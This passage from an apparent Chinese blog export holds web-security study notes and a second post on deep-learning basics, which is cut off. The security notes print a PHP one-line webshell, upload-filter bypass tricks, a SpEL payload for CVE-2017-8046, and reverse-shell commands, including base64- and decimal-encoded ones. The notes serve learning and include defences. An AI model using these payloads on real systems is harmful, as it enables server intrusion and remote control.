App（或Web应用程序）运行于网络和标准浏览器上，基于网页技术开发实现特定功能的应用</p><ul><li><p>前端：HTML，CSS，JavaScript</p></li><li><p>后端：Java，Python，PHP</p></li><li><p>数据库：MySQL，Oracle，MongoDB</p></li><li><p>容器：Windows(IIS)，Linux(Nginx, Apache)</p></li></ul><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210823-100700848.png" alt="web服务组件"></p><h5 id="从输入网址到看到网页过程">从输入网址到看到网页过程</h5><ul><li><p>客户输入URL，DNS解析URL得出IP地址，根据IP地址找出对应服务器</p></li><li><p>客户机通过TCP/IP协议建立到Web服务器的TCP链接</p></li><li><p>客户机向Web服务器发送HTTP请求报文，请求服务器里资源的资源文档</p></li><li><p>Web服务器接收到客户机的HTTP请求报文，然后向客户机发出HTTP响应报文</p><ul><li>请求的种类不同（HTML文档、PHP文件、访问数据库），服务器的行为不一样</li></ul></li><li><p>客户机解析HTML静态文档</p></li><li><p>客户机与服务器断开链接</p></li></ul><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210821-web-process.png" style="zoom:80%;"><h5 id="Python实现简单服务器">Python实现简单服务器</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">:</span>    buf <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token string">"HTTP/1.1 200 OK\r\n\r\n"</span>    msg1 <span class="token operator">=</span> <span class="token string">"Hello World!"</span>    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> msg<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> msg1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    ip_port <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ip_port<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        handleRequest<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="框架">框架</h5><p>Web应用框架（Web application framework）是一种开发框架，用来支持动态网站、网络应用程序及网络服务的开发</p><ul><li><p>类型有基于请求的和基于组件的</p></li><li><p>有助于减轻网页开发时共通性活动的工作负荷，例如许多框架提供数据库访问接口、标准样板以及会话管理等</p></li><li><p>可提升代码的可再用性</p></li></ul><h3 id="3-Web安全总览">3. Web安全总览</h3><h4 id="3-1-协议基础">3.1 协议基础</h4><h5 id="HTTP协议">HTTP协议</h5><p>HTTP协议定义了Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端</p><p><a href="https://night-candle.github.io/2021/02/04/cs-network-protocol/#toc-heading-5">HTTP/1.1</a></p><h4 id="3-2-安全溯源">3.2 安全溯源</h4><p>Web应用全部都是建立在HTTP协议基础上，是对HTTP协议的实际应用</p><p>Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210821-safety-traceability.png" alt=""></p><blockquote><p><strong>Web安全根本在于Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击</strong></p></blockquote><h4 id="3-3-安全问题">3.3 安全问题</h4><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210821-sec-problem.png" style="zoom:80%;"><h2 id="后端安全">后端安全</h2><h3 id="1-文件上传漏洞">1. 文件上传漏洞</h3><p>文件上传（<code>File Upload</code>）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等</p><p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等</p><h4 id="1-1-编辑木马并上传">1.1 编辑木马并上传</h4><blockquote><p>关键函数</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-eval.png" alt=""></p></blockquote><p>一句话木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-115203947.png" alt="测试"></p><h4 id="1-2-绕过方法">1.2 绕过方法</h4><h5 id="1-2-1-服务器关联型漏洞">1.2.1 服务器关联型漏洞</h5><p><strong>IIS 5.x / 6.0 解析漏洞</strong></p><p>当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件</p><p>漏洞利用：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a> 会被解析成asp文件</p><p>服务器默认不解析“;”以后的内容</p><p>漏洞利用：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a> 会被解析成为asp文件</p><p><strong>Nginx 解析漏洞</strong></p><p>低版本Nginx存在一个由PHP-CGI导致的文件解析漏洞：php.ini配置文件中cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析</p><p>漏洞利用：<a href="http://xn--www-7n0jp43b.xx.com/phpinfo.jpg/1.php">访问www.xx.com/phpinfo.jpg/1.php</a> （1.php不存在，会按照php格式解析phpinfo.jpg文件）</p><p><strong>Apache 解析漏洞</strong></p><p>Apache 在1.x和2.x版本中存在解析漏洞：Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析</p><p>漏洞利用：上传并访问shell.php.test；服务器会解析shell.php.test文件，但是按照php文件格式进行解析</p><h5 id="1-2-2-前端限制绕过">1.2.2 前端限制绕过</h5><p>只在前端利用 JavaScript 来做校验</p><p>漏洞利用：</p><ol><li><p>通过Burp Suite抓包，然后修改内容后放行</p></li><li><p>通过Chrome禁止/删除JavaScript代码</p></li></ol><h5 id="1-2-4-黑名单绕过">1.2.4 黑名单绕过</h5><ul><li><p>content-type绕过</p></li><li><p>大小写绕过</p><ul><li><p>Win平台大小写不敏感</p></li><li><p>Linux平台造成此现象主要原因是缺少speling模块，要在相应的系统里加载</p></li></ul></li><li><p>双写绕过</p></li><li><p>生僻扩展名绕过</p><ul><li><p>修改后缀为 .php3 .php4 .php5 等</p></li><li><p>原理：配置文件/etc/apache2/mods-enabled/php5.conf</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-124322.png" alt=""></p></li></ul></li><li><p>扩展名加空格绕过</p></li><li><p>Windows 文件流特性绕过</p><ul><li>NTFS文件系统实现了<strong>多文件流特性</strong>，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序</li><li>扩展名加点号绕过(Win)</li><li>扩展名加::$DATA绕过(Win)</li></ul></li><li><p>.htaccess绕过</p><ul><li><p><strong>.htaccess文件</strong>（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件，启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤</p></li><li><p>漏洞利用：上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php .test】，上传一句话木马文件，文件名设置为shell.test</p></li></ul></li><li><p>文件头检测绕过</p><ul><li>拼接png与php文件</li></ul></li></ul><h5 id="1-2-5-00截断绕过">1.2.5 %00截断绕过</h5><p>原理：保存文件的时候是路径拼接的形式，而路径又是从前端获取，所以可以采用在路径上截断</p><h5 id="1-2-6-漏洞链">1.2.6 漏洞链</h5><p>基于我们已经成功上传一句话木马内容的jpg，联合使用本地/远程文件包含漏洞，既可以完成渗透</p><blockquote><p><strong>Fuzz</strong></p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-fuzz.png" alt=""></p><p>模糊测试（fuzz testing）和渗透测试（penetration test）都是属于安全测试的方法，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用；而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议</p><p><strong>注意事项</strong>：</p><ol><li><p>Fuzz过程由于会产生大量异常输入，未经人工分析，可能造成生产环境崩溃，因此多用于非生产环境</p></li><li><p>Fuzz过程会产生大量负载，可能会对生产环境造成影响</p></li><li><p>安全监测过程中很容易由于过多访问触发安全警报，进而为后续安全检测制造障碍</p></li></ol></blockquote><h4 id="1-3-防御方法">1.3 防御方法</h4><ul><li><p>文件类型检测：白名单优于黑名单</p></li><li><p>使用安全的函数进行编程</p></li><li><p>熟悉业务部署环境的OS、Web Server配置</p></li></ul><h3 id="2-SQL注入">2. SQL注入</h3><p>SQL注入漏洞是发生于应用程序与数据库层的安全漏洞。</p><p>网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险</p><h4 id="2-1-MySQL基础">2.1 MySQL基础</h4><p>1、学习函数</p><p>​    掌握以下函数的用法，并在命令行进行实践操作：concat()、group_concat()、concat_ws()、load_file()、hex()、char()、count()、substring()、into+outfile、LOAD DATA INFIL、limit</p><h4 id="GET-注入">GET 注入</h4><h4 id="POST-注入">POST 注入</h4><h4 id="OOB注入">OOB注入</h4><h4 id="WAF绕过">WAF绕过</h4><h4 id="SQLMap">SQLMap</h4><h3 id="3-框架安全">3. 框架安全</h3><p>随着应用开发的复杂度提升，很难再有完全从零开发的web应用，而更多的使用web框架，很大一部分开源框架得到了全世界的开发者支持，具备更加强大功能和完善的支持</p><p>开源框架的问题在于源码被全世界的开发者所阅读，一旦一个大型框架出现漏洞，那么黑客相当于拿到了所有使用这个框架的网站的通行证，几乎所有的大型框架都出现过漏洞，影响范围非常广</p><blockquote><p><strong>CVE- Common Vulnerabilities &amp; Exposures</strong>：广泛认同的信息安全漏洞或者已经暴露出来的弱点给出的一个公共名称</p><p>认定的一般流程：</p><p>发现—&gt;公开—&gt;编号—&gt;提案—&gt;修改—&gt;中间决策—&gt;最终决策—&gt;正式发布—&gt;（再评估）—&gt;（撤销）</p></blockquote><h4 id="spring-data-rest-（CVE-2017-8046）">spring-data-rest （CVE-2017-8046）</h4><p>Spring Data Rest设计的目的是消除curd的模板代码，减少程序员的刻板的重复劳动，增删改查动作分别对应四种请求类型：post、delete、update/patch、get</p><p><code>PATCH</code> 方法是 HTTP 协议新引入的，是对 PUT 方法的补充，使用 JSON 格式数据来对已知资源进行局部更新</p><ul><li><p>Spring 3.2 开始支持 PATCH 方法，但要选对部署的容器</p></li><li><p>由 RFC6902 所约束，需包含 path 和 op 字段</p></li><li><p>具有自己的 MIME 类型：application/json-patch+json</p></li><li><p>op 代表操作，必须存在，只能由6种明确表示操作的词汇组成，每一个操作结果作为下一个操作的对象，如果发生错误即返回错误信息，则全部变更不生效，成功返回204</p></li></ul><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-132934071.png" style="zoom: 50%;"><p><strong>漏洞示例：</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">curl -i -X POST -H "Content-Type: application/json-patch+json" -d "{""first name"":""si"",""lastname"":""Li""}" http://192.168.56.102:81/customers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-131431118.png" alt=""></p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-134949328.png" alt="漏洞利用"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token property">"op"</span><span class="token operator">:</span> <span class="token string">"replace"</span><span class="token punctuation">,</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastName"</span><span class="token punctuation">,</span> <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"test"</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-135948546.png" alt=""></p><blockquote><p><strong>反弹shell</strong></p><p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p><p><strong>base64编码</strong></p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}</p><p><strong>进制转换</strong></p><p>98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,65,117,77,84,65,122,76,122,99,51,78,122,99,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125</p></blockquote><p><strong>漏洞分析</strong></p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-vulnerability-analysis.png" alt=""></p><p><strong>漏洞修复</strong></p><p>在 1.5.7 版本中就对漏洞进行了修复，PatchOperation 类的 evaluateValueFromTarget 方法里面加入了verifyPath, 对路径的有效性做了验证，主要过滤了数字</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-141237193.png" alt=""></p><h4 id="防御措施">防御措施</h4><ul><li><p>关注官方网站，及时追踪更新</p></li><li><p>关注漏洞披露网站</p><p>CVE <a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p><p>Exploit Database <a href="https://www.exploit-db.com">https://www.exploit-db.com</a></p><p>ZERODIUM <a href="https://zerodium.com/">https://zerodium.com/</a></p></li></ul><h2 id="前端安全">前端安全</h2><h3 id="1-跨站脚本攻击（XSS）">1. 跨站脚本攻击（XSS）</h3><p>OWASP Top10 2017 第七，浏览器将用户输入的内容，当做脚本执行，执行了恶意的功能，这种针对用户浏览器的攻击即跨站脚本攻击</p><p><strong>XSS 危害</strong><br>（JavaScript 能够写出的任意恶意功能）</p><ul><li>盗取 Cookie</li><li>盗取账户</li><li>恶意软件下载</li><li>键盘记录</li><li>广告引流</li></ul><h4 id="1-1-反射型">1.1 反射型</h4><p>应用程序或 API 包括未经验证和未经转义的用户输入， 直接作为 HTML 输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的 HTML 和 JavaScript</p><p>特点：非持久化，必须用户点击带有特定参数的链接才能引起</p><p>影响范围：仅执行脚本的用户</p><h4 id="1-2-存储型">1.2 存储型</h4><h4 id="1-3-DOM-型">1.3 DOM 型</h4><h3 id="2-CSRF">2. CSRF</h3><h3 id="3-RCE">3. RCE</h3><h2 id="容器安全">容器安全</h2><h3 id="Apache">Apache</h3><h3 id="Nginx">Nginx</h3><h3 id="Tomcat">Tomcat</h3><h2 id="互联网企业安全运营">互联网企业安全运营</h2><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210202-223222691.png" alt="image-20210202223222691" style="zoom: 70%;"><h3 id="DDos">DDos</h3><h3 id="访问控制">访问控制</h3>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习基础</title>
      <link href="2021/01/25/deeplearning-basic/"/>
      <url>2021/01/25/deeplearning-basic/</url>
      
        <content type="html"><![CDATA[<h1>深度学习</h1><h2 id="1-1-深度学习和神经网络">1.1 深度学习和神经网络</h2><h3 id="1-1-1-深度学习简介">1.1.1 深度学习简介</h3><h4 id="概念">概念</h4><p><strong>深度学习</strong><code>deep learning</code>是机器学习的分支，是一种以人工神经网络为架构，对数据进行特征学习的算法</p><p>机器学习和深度学习的区别：</p><ul><li><p>从<strong>特征提取</strong>的角度出发：</p><ul><li><p>机器学习需要有人工的特征提取的过程</p></li><li><p>深度学习中特征提取的过程可以通过深度神经网络自动完成</p></li></ul></li><li><p>从<strong>数据量</strong>的角度出发：</p><ul><li><p>深度学习需要大量的训练数据集，会有更好的效果</p></li><li><p>深度学习训练有更多的参数的深度神经网络需要大量的算力</p></li></ul></li></ul><h4 id="应用场景">应用场景</h4><ul><li><p>图像识别</p></li><li><p>自然语言处理技术</p></li><li><p>语音技术</p></li></ul><h3 id="1-1-2-神经网络简介">1.1.2 神经网络简介</h3><h4 id="概念-2">概念</h4><p><strong>人工神经网络</strong><code>Artificial Neural Network</code>，简称<strong>神经网络</strong><code>Neural Network</code>或<strong>类神经网络</strong>，是一种模仿生物神经网络的结构和功能的数学模型，用于对函数进行估计或近似。</p><p>​</p><h4 id="神经元">神经元</h4><p>1943 年，McCulloch 和 Pitts 将生物的神经网络抽象为一个简单模型，即 <strong>M-P 神经元模型</strong>。把许多这样的神经元按一定的层次结构连接起来，就得到神经网络。</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/simple-neuron.png" alt="一个简单的神经元"></p><ol><li>$a_1,a_2\dots a_n$ 为各个输入的分量</li><li>$w_1,w_2 \cdots w_n$ 为各个输入分量对应的权重参数</li><li>$b$ 为偏置</li><li>$f$ 为<strong>激活函数</strong>，常见的激活函数有<code>tanh</code>，<code>sigmoid</code>，<code>relu</code></li><li>$t$ 为神经元的输出</li></ol><p>​</p><p><strong>一个神经元的功能是求得输入向量与权向量的内积后，经一个非线性传递函数得到一个标量结果</strong>，数学公式表示：<br>$$<br>t = f(W^TA+b)<br>$$<br>​</p><h4 id="单层神经网络">单层神经网络</h4><p>最基本的神经元网络形式，由有限个神经元构成，所有神经元的输入向量都是同一个向量。单层神经元的输出是一个向量，向量的维数等于神经元的数目。</p><p>​</p><h4 id="感知机">感知机</h4><p>感知机由<strong>两层</strong>神经网络组成，输入层接收外界输入信号后传递给输出层**（输出 +1正例，-1反例）**，输出层是 M-P 神经元。</p><p><strong>感知机的作用</strong></p><p>简单的二分类模型，把一个n维向量空间用一个超平面分割成两部分，给定一个输入向量，超平面可以判断出这个向量位于超平面的哪一边，得到输入正类或者是反类，<strong>对应到2维空间就是一条直线把一个平面分为两个部分</strong>。</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210831-perceptron.png" alt=""></p><p>​</p><h4 id="多层神经网络">多层神经网络</h4><p>多层神经网络由单层神经网络叠加得到，所以形成了<strong>层</strong>的概念，常见的多层神经网络有如下结构。</p><ul><li><p>输入层<code>Input layer</code>，众多神经元接受大量输入消息。（输入的消息称为输入向量）</p></li><li><p>输出层<code>Output layer</code>，消息在神经元链接中传输、分析、权衡，形成输出结果。（输出的消息称为输出向量）</p></li><li><p>隐藏层<code>Hidden layer</code>，是输入层和输出层之间众多神经元和链接组成的各个层面。隐层可以有一层或多层。隐层的节点数目不定，但数目越多神经网络的非线性越显著，从而神经网络的强健性更显著。</p></li></ul><p><strong>全连接层</strong></p><p>当前一层和前一层每个神经元相互链接，称当前这一层为全连接层</p><p>全连接层就是在前一层的输出的基础上进行一次 $Y=Wx+b$ 的变化（不考虑激活函数的情况下就是一次线性变化）</p><p>​</p><h4 id="激活函数">激活函数</h4><p>激活函数很重要的一个作用就是<strong>增加模型的非线性分割能力</strong></p><p>如果在感知机的基础上加上<strong>非线性的激活函数</strong>之后，输出的结果就不再是一条直线</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/activation-function.png" alt=""></p><p>如果给定合适的参数 $w$ 和 $b$ ，就可以得到合适的曲线，能够完成对最开始问题的非线性分割</p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/common-activation-functions.jpg" alt="常见的激活函数" style="zoom:95%;"><ul><li><p><code>sigmoid</code> 只会输出正数，以及靠近0的输出变化率最大</p></li><li><p><code>tanh</code>输出可以是负数</p></li><li><p><code>Relu</code>是输入只能大于0，常用于输入是图片格式，因为图片的像素值作为输入时取值为[0,255]</p></li></ul><p><strong>激活函数的作用：</strong></p><ul><li><p>增加模型的非线性分割能力</p></li><li><p>提高模型鲁棒性</p></li><li><p>缓解梯度消失问题</p></li><li><p>加速模型收敛</p></li></ul><p><strong>深度学习的思想:</strong></p><p>通过模型来进行特征工程，进行更加高级特征的学习，然后通过传入的数据来确定合适的参数，让模型去更好的拟合数据。</p><p>​</p><p>​</p><h3 id="1-1-3-梯度下降">1.1.3 梯度下降</h3><h4 id="梯度是什么">梯度是什么?</h4><p>机器学习中构建机器学习模型$f$，得到$f(x,w) = Y_{predict}$</p><p>判断模型好坏的方法：</p><ul><li><p>回归损失$loss = (Y_{predict}-Y_{true})^2$</p></li><li><p>分类损失$loss = Y_{true} \cdot log(Y_{predict})$</p></li></ul><p>目标：通过调整参数$w$，尽可能的降低$loss$</p><p>随机选择一个起始点$w_0$,通过调整$w_0$，让$loss$函数取到最小值</p><p><strong>$w$的更新方法</strong>：</p><ol><li>计算$w$的梯度</li></ol><p>$$<br>\nabla w = \frac{f(w+0.000001)-f(w-0.000001)}{2*0.000001}<br>$$</p><ol start="2"><li>更新$w$<br>$$<br>w = w - \alpha \nabla w<br>$$</li></ol><p>其中：</p><ol><li>$\nabla w &lt;0 $ ,意味着w将增大</li><li>$\nabla w &gt;0 $ ,意味着w将减小</li></ol><p>总结：<strong>梯度就是多元函数参数的变化趋势</strong>，只有一个自变量时称为导数</p><p>​</p><h4 id="偏导的计算">偏导的计算</h4><p><strong>常见的导数计算</strong></p><ul><li><p>多项式求导数：$f(x) = x^5$ ,$f^{'}(x) = 5x^{(5-1)}$</p></li><li><p>基本运算求导：$f(x) = xy$ ，$f^{'}(x) = y$</p></li><li><p>指数求导：$f(x) = 5e^x$ ，$f^{'}(x) = 5e^x$</p></li><li><p>对数求导：$f(x) = 5lnx$ ，$f^{'}(x) = \frac{5}{x}$</p></li><li><p>导数的微分形式：$f^{'}(x) = \frac{d f(x)}{dx}$</p></li></ul><p>​</p><p><strong>多元函数求偏导</strong></p><p>多元函数，即有多个自变量。如$f(x,y,z)$</p><p>多元函数求偏导过程中：<strong>对某一个自变量求导，其他自变量当做常量即可</strong></p><p>​</p><p>​</p><h3 id="1-1-4-反向传播算法">1.1.4 反向传播算法</h3><h4 id="计算图和反向传播">计算图和反向传播</h4><p><strong>计算图</strong>：通过图的方式来描述函数的图形</p><p>$J(a,b,c) = 3(a+bc),令u=a+v,v = bc$，绘制成计算图可以表示为：</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210902-calculation-chart.png" alt=""></p><p>对每个节点求偏导可有：</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210902-back-propagation.png" alt=""></p><p>自变量$a,b,c$各自的偏导就是连线上的梯度的乘积：<br>$$<br>\frac{dJ}{da} = 3 \cdot 1 \\<br>\frac{dJ}{db} = 3 \cdot 1 \cdot c \\<br>\frac{dJ}{dc} = 3 \cdot 1 \cdot b<br>$$<br>​</p><p>​</p><h4 id="神经网络的反向传播">神经网络的反向传播</h4><p><strong>神经网络示意图</strong></p><p><img src="deeplearning-basic/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E8%AE%A1%E7%AE%97%E5%9B%BE.png" alt=""></p><p>$w1,w2,…wn$表示网络第n层权重</p><p>$w_n[i,j]$表示第n层第i个神经元，连接到第n+1层第j个神经元的权重</p><p><strong>神经网络计算图</strong></p><p><img src="deeplearning-basic/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E8%AE%A1%E7%AE%97%E5%9B%BE2.png" alt=""></p><p>其中：</p><ol><li>$\nabla out$是根据损失函数对预测值进行求导得到的结果</li><li>$f$函数可以理解为激活函数</li></ol><p>​</p><p>​</p><p>**问题：**那么此时$w_1[1,2]$的偏导该如何求解？</p><p>通过观察，发现从$out$ 到$w_1[1,2]$的来连接线有两条</p><p><img src="%E5%81%8F%E5%AF%BC%E7%9A%84%E8%AE%A1%E7%AE%97.png" alt=""></p><p>公式分为两部分：左边红线部分（右边红线部分 + 蓝线部分），结果：<br>$$<br>\frac{dout} {dW_1[1,2]} = x1 \cdot f’(a2) \cdot ( W_2[2,1] \cdot f’(b1) \cdot W_3[1,1] \cdot \nabla out +W_2[2,2] \cdot f’(b2) \cdot W_3[2,1] \cdot \nabla out)<br>$$<br>但是当模型很大的时候，计算量非常大，所以反向传播的思想就是<strong>对其中的某一个参数单独求梯度</strong>之后更新，如下图所示：</p><p><img src="%E5%81%8F%E5%AF%BC%E7%9A%84%E8%AE%A1%E7%AE%972.png" alt=""></p><p>计算过程如下<br>$$<br>\begin{array}{c}<br>\nabla W_3[1,1] = f(b_1) \cdot \nabla out \\<br>\nabla W_3[2,1] = f(b_2) \cdot \nabla out \\<br>\nabla b_1= f’(b_1) \cdot W_3[1,1] \cdot \nabla out \\<br>\nabla b_2= f’(b_2) \cdot W_3[2,1] \cdot \nabla out<br>\end{array}<br>$$<br>更新参数之后，继续反向传播</p><p><img src="%E5%81%8F%E5%AF%BC%E7%9A%84%E8%AE%A1%E7%AE%973.png" alt=""></p><p>计算过程如下：<br>$$<br>\begin{array}{c}<br>\nabla W_2[1,2] = f(a_1)\cdot \nabla b_2 \\<br>\nabla a_2 = f’(a_2)\cdot (w_2[2,1]\nabla b_1 +W_2[2,2] \nabla b_2)<br>\end{array}<br>$$<br>继续反向传播</p><p><img src="%E5%81%8F%E5%AF%BC%E7%9A%84%E8%AE%A1%E7%AE%974.png" alt=""></p><p>计算过程如下：<br>$$<br>\begin{array}{c}<br>\nabla W_1[1,2]= x_1\cdot \nabla a_2 \\<br>\nabla x_1 = (W_1[1,1]\cdot \nabla a_1+w_1[1,2]\cdot \nabla a_2)<br>\end{array}<br>$$</p><p><strong>通用的描述如下</strong>：<br>$$<br>\nabla w^l_{i,j} = f(a^l_i)\cdot \nabla a^{i+1}_{j}<br>$$</p><p>$$<br>\nabla a^l_i = f’(a^l_i)\cdot (\sum_{j=1}^m w_{i,j}\cdot \nabla a_j^{l+1})<br>$$</p><p>​</p><p>​</p><h2 id="1-2-PyTorch">1.2 PyTorch</h2><h3 id="1-2-1-PyTorch实现线性回归">1.2.1 PyTorch实现线性回归</h3><h4 id="向前计算">向前计算</h4><p>对于pytorch中的一个tensor，如果设置它的属性 <code>.requires_grad</code>为<code>True</code>，那么它将会追踪对于该张量的所有操作。或者可以理解为，这个tensor是一个参数，后续会被计算梯度，更新该参数。</p><p>​</p><p><strong>计算过程</strong></p><p>假设有以下条件（1/4表示求均值，xi中有4个数），使用torch完成其向前计算的过程<br>$$<br>\begin{array}{c}<br>&amp;o = \frac{1}{4}\sum_iz_i \\<br>&amp;z_i = 3(x_i+2)^2\\<br>其中:&amp;z_i|_{x_i=1}=27<br>\end{array}<br>$$<br>如果$x$为参数，需要对其进行梯度的计算和更新，那么在最开始随机设置$x$的值的过程中，需要设置他的<code>requires_grad</code>属性为True，其<strong>默认值为False</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torchx <span class="token operator">=</span> torch<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment">#初始化参数x并设置requires_grad=True用来追踪其计算历史</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#tensor([[1., 1.],</span><span class="token comment">#        [1., 1.]], requires_grad=True)</span>y <span class="token operator">=</span> x<span class="token operator">+</span><span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span 